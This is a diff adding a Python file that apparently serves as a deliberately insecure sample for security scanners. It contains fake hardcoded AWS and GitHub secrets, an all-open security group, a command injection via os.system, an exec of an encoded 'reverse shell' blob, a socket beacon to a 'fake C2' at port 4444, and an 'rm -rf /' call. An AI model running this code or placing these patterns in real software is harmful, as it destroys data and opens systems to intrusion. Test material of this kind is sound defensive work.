@@ -1,0 +1,37 @@
+import os
+import subprocess
+import base64
+import socket
+AWS_SECRET_ACCESS_KEY = "wJalrXUtnFakeKey1234567890FakeEXAMPLEKEY"
+GITHUB_TOKEN = "ghp_fakeGitHubToken1234567890abcdef"
+# === IaC-like misconfigurations (as code) ===
+security_group = {
+    "name": "open_sg",
+    "ingress": [
+        {"from_port": 0, "to_port": 65535, "protocol": "tcp", "cidr_blocks": ["0.0.0.0/0"]},
+    ],
+    "egress": [
+        {"from_port": 0, "to_port": 0, "protocol": "-1", "cidr_blocks": ["0.0.0.0/0"]},
+    ]
+}
+def risky_behavior():
+    # === Command injection ===
+    user_input = input("Enter filename: ")
+    os.system("cat " + user_input)
+    # === Reverse Shell (obfuscated) ===
+    shell_code = "c29ja2V0LnNvY2tldCghJ3NvY2suaW8nLCA4MDgwKQpyZXMudWVkKDApCnJlcC5maWxlZGVzY3JpcHRvcihucy5k..."
+    try:
+        exec(base64.b64decode(shell_code))
+    except:
+        pass
+    # === Suspicious network connection ===
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("192.168.1.100", 4444))  # Fake C2 server
+    s.send(b"hello from infected host")
+    # === Subprocess misuse ===
+    subprocess.call("rm -rf /", shell=True)
+def main():
+    print("Starting insecure operations...")
+    risky_behavior()
+if __name__ == "__main__":
+    main()
